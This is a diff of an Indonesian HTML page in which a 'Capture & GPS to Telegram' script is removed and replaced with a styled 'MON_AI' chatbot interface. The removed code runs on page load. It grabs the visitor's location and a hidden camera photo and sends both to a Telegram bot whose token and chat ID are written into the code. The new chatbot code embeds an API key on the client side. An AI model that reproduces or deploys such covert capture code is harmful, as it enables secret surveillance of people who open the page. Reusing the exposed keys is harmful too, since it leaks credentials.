@@ -1,93 +1,175 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Capture & GPS to Telegram</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>MON_AI - Chatbot AI</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
+
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #00ffff;
+      font-family: 'Orbitron', monospace, sans-serif;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+
+    h1 {
+      font-size: 3rem;
+      text-shadow:
+        0 0 5px #00ffff,
+        0 0 10px #00ffff,
+        0 0 20px #00ffff;
+      margin-bottom: 10px;
+    }
+
+    #chatbox {
+      background: #0a0a0a;
+      border: 2px solid #00ffff;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 600px;
+      height: 400px;
+      padding: 10px;
+      overflow-y: auto;
+      box-shadow:
+        0 0 10px #00ffff,
+        0 0 20px #00ffff;
+    }
+
+    .message {
+      margin: 8px 0;
+      padding: 8px 12px;
+      border-radius: 8px;
+      max-width: 80%;
+      word-wrap: break-word;
+      box-shadow: 0 0 5px #00ffff;
+    }
+
+    .user {
+      background: #004d4d;
+      color: #aaffff;
+      align-self: flex-end;
+      text-align: right;
+    }
+
+    .bot {
+      background: #002626;
+      color: #33ffff;
+      align-self: flex-start;
+      text-align: left;
+    }
+
+    #inputArea {
+      margin-top: 15px;
+      width: 90%;
+      max-width: 600px;
+      display: flex;
+    }
+
+    #promptInput {
+      flex: 1;
+      padding: 12px;
+      font-size: 1.1rem;
+      border: 2px solid #00ffff;
+      border-radius: 10px 0 0 10px;
+      background: #000;
+      color: #00ffff;
+      outline: none;
+      box-shadow:
+        inset 0 0 10px #00ffff;
+    }
+
+    #sendBtn {
+      padding: 12px 20px;
+      font-size: 1.1rem;
+      background: #00ffff;
+      color: #000;
+      border: none;
+      border-radius: 0 10px 10px 0;
+      cursor: pointer;
+      box-shadow:
+        0 0 15px #00ffff;
+      transition: background 0.3s ease;
+    }
+
+    #sendBtn:hover {
+      background: #00cccc;
+    }
+
+    #loading {
+      margin-left: 15px;
+      color: #00ffff;
+      font-style: italic;
+      display: none;
+    }
+
+  </style>
 </head>
 <body>
-  <h3 id="status">Memulai...</h3>
-  <video id="video" autoplay playsinline muted style="display:none;"></video>
 
-<script>
-const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k"; // ganti ini
-const CHAT_ID = "7218964278";     // ganti ini
-const statusText = document.getElementById("status");
-const video = document.getElementById("video");
+  <h1>MON_AI</h1>
 
-async function sendToTelegram(photoData, lokasi) {
-  // Kirim lokasi
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: `Lokasi: ${lokasi}`
-    })
-  });
+  <div id="chatbox"></div>
 
-  // Kirim foto
-  const blob = await (await fetch(photoData)).blob();
-  const formData = new FormData();
-  formData.append("chat_id", CHAT_ID);
-  formData.append("photo", blob, "capture.png");
+  <div id="inputArea">
+    <input type="text" id="promptInput" placeholder="Ketik pertanyaanmu..." autocomplete="off" />
+    <button id="sendBtn">Kirim</button>
+    <span id="loading">Loading...</span>
+  </div>
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: "POST",
-    body: formData
-  });
-}
+  <script>
+    const chatbox = document.getElementById('chatbox');
+    const promptInput = document.getElementById('promptInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const loading = document.getElementById('loading');
 
-async function start() {
-  let lokasi = "Lokasi tidak tersedia";
-  let photoData = null;
+    function addMessage(text, sender) {
+      const msgDiv = document.createElement('div');
+      msgDiv.classList.add('message', sender);
+      msgDiv.textContent = text;
+      chatbox.appendChild(msgDiv);
+      chatbox.scrollTop = chatbox.scrollHeight;
+    }
 
-  // Ambil lokasi (izin akan diminta otomatis)
-  try {
-    await new Promise((resolve, reject) => {
-      navigator.permissions.query({name:'geolocation'}).then(result => {
-  if (result.state === 'granted' || result.state === 'prompt') {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => { lokasi = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`; },
-      (err) => { lokasi = "Gagal dapat lokasi: " + err.message; }
-    );
-  } else {
-    lokasi = "Lokasi diblokir oleh pengguna.";
-  }
-});
-  } catch {}
+    async function sendPrompt() {
+      const prompt = promptInput.value.trim();
+      if (!prompt) return;
+      addMessage(prompt, 'user');
+      promptInput.value = '';
+      loading.style.display = 'inline';
 
-  // Akses kamera
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => {
-        video.play();
-        resolve();
-      };
+      try {
+        // Ganti URL dan method sesuai backend AI kamu nanti
+        const res = await fetch('/ai', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-api-key': 'AIzaSyALpIVNU2sMEaatfYwbxzjBsEKBIy6fNEQ' // Ganti dengan API key Gemini-mu
+          },
+          body: JSON.stringify({ prompt })
+        });
+        if (!res.ok) throw new Error('Response error');
+
+        const data = await res.json();
+        addMessage(data.response || 'Tidak ada jawaban dari AI.', 'bot');
+      } catch (error) {
+        addMessage('Error saat menghubungi AI: ' + error.message, 'bot');
+      } finally {
+        loading.style.display = 'none';
+      }
+    }
+
+    sendBtn.addEventListener('click', sendPrompt);
+    promptInput.addEventListener('keypress', e => {
+      if (e.key === 'Enter') sendPrompt();
     });
+  </script>
 
-    // Tunda agar kamera menyala sempurna
-    await new Promise((resolve) => setTimeout(resolve, 3000));
-
-    // Ambil gambar dari kamera
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    photoData = canvas.toDataURL("image/png");
-
-    // Matikan kamera
-    stream.getTracks().forEach((track) => track.stop());
-  } catch (e) {
-    statusText.textContent = "Gagal akses kamera: " + e.message;
-  }
-
-  statusText.textContent = "Mengirim ke Telegram...";
-  await sendToTelegram(photoData, lokasi);
-  statusText.textContent = "Selesai, cek Telegram.";
-}
-
-start();
-</script>
 </body>
 </html>
